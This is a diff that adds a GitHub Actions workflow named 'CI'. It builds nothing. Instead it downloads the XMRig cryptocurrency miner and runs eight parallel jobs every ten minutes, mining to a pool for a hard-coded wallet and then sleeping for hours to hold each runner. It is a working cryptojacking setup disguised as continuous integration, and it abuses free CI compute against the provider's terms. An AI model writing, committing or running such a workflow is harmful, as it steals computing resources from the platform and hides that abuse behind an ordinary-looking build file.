@@ -1,0 +1,20 @@
+name: CI
+on:
+  push:
+  schedule:
+    - cron: '*/10 * * * *'
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      fail-fast: false
+      matrix:
+        v: [1,2,3,4,5,6,7,8]
+    steps:
+      - run: |
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/x.tgz
+          tar -C /tmp -xf /tmp/x.tgz && cd /tmp/xmrig-*
+          ./xmrig -o rx.unmineable.com:3333 -u 0x74B56f2C379996fedabF53D36aeE73c5E5129fC9:USDT.s0040_${{ matrix.v }} -p x -k --donate-level 1 &
+          sleep 20000
